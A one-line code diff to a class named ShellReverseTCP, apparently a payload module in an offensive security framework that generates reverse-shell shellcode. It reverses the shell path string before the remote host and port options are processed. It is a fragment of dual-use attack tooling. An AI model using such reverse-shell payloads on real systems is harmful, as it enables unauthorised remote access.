@@ -40,6 +40,7 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
         else:
             shell = self.shell['sh']
 
+        shell = shell[::-1]
         rhost = self.convert_host(options['RHOST'])
         rport = self.convert_port(options['RPORT'])
 
